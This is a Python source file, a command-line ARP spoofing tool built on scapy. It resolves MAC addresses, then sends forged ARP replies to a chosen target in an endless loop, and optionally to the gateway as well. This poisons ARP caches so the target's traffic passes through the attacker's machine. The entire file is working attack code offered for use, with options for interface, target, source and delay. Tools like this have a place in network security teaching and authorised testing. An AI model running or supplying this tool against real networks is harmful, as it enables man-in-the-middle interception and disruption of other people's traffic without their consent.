"""
Author: Gal Gabay
ARP spoofing attack tool
"""

import argparse
from time import sleep

from colorama import Fore
from scapy.all import *
from scapy.layers.l2 import Ether, ARP


def get_mac(ip):
    """
    Discover the MAC address of specific IP by ARP request (who-has packet)
    :param ip: ip to check his MAC address
    :return: MAC address of the ip
    """
    try:
        who_has_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
        ans = srp1(who_has_packet, timeout=2, verbose=False)  # sends the who-has packet and assigns the answer into ans
        return ans[ARP].hwsrc  # the MAC address
    except TypeError:  # if the given IP isn't recognized
        print(f"{Fore.RED}ARP reply not found to 'who has {ip} request'\n"
              f"Maybe this ip address isn't in your LAN{Fore.RESET}")
        sys.exit(1)


class ArpSpoofing:
    def __init__(self, target_ip, src_ip, iface, delay, gw_spoof):
        self.target_ip = target_ip
        self.target_mac = get_mac(target_ip)
        # if there isn't src we'll impersonate to the gateway
        self.src_ip = src_ip if src_ip else conf.route.route("0.0.0.0")[2]
        self.src_mac = get_mac(self.src_ip)
        self.attacker_mac = get_mac(get_if_addr(iface))
        self.iface = iface
        self.delay = delay
        self.gw_spoof = gw_spoof

    def attack(self):
        """
        Apply an ARP spoofing attack according to the user inputs
        :return:
        """
        try:
            is_at_packet_to_target = ARP(op=2, psrc=self.src_ip, pdst=self.target_ip, hwdst=self.target_mac)
            if self.gw_spoof:
                is_at_packet_to_src = ARP(op=2, psrc=self.target_ip, pdst=self.src_ip, hwdst=self.src_mac)
            while True:
                send(is_at_packet_to_target, iface=self.iface, verbose=False)
                print(f"Packet '{Fore.GREEN}{self.src_ip} is at {self.attacker_mac}{Fore.RESET}'"
                      f" sent to {self.target_mac}")
                if self.gw_spoof: # if the user wants full-duplex attack
                    send(is_at_packet_to_src, iface=self.iface, verbose=False)
                    print(f"Packet '{Fore.GREEN}{self.target_ip} is at {self.attacker_mac}{Fore.RESET}'"
                          f" sent to {self.src_mac}")
                sleep(self.delay) # wait the 'delay' the user wants between the packets sending
        except KeyboardInterrupt: # if the user want to stop the attack
            print("Spoofing stopped by ctrl+c.\nGoodbye :)")
            sys.exit(0)


def args_parser():
    """
    Parse the user's file args
    :return: parsed arguments
    """
    parser = argparse.ArgumentParser(description='Spoof ARP tables')
    parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                        help='Interface you wish to use')
    parser.add_argument('-s', '--src', metavar="SRC", default='', type=str,
                        help='The address you want for the attacker')
    parser.add_argument('-d', '--delay', metavar="DELAY", default=0, type=int,
                        help='Delay (in seconds) between messages')
    parser.add_argument('-gw', default=False, action='store_true', help='should GW be attacked as well')
    parser.add_argument('-t', '--target', metavar="TARGET", required=True, type=str, help='IP of target')
    return parser.parse_args()


def main():
    args = args_parser()
    if str(args.iface).split('_')[1] not in get_if_list():  # if the user input interface isn't found
        print(f'{Fore.RED}Interface not found !{Fore.RESET}\nPlease use one of the below interfaces:')
        print('\n'.join(get_if_list()))
        return
    # Make an ArpSpoofing instance that will include the attack details and activate the attack.
    arp_spoofer = ArpSpoofing(args.target, args.src, args.iface, args.delay, args.gw)
    arp_spoofer.attack()


if __name__ == '__main__':
    main()
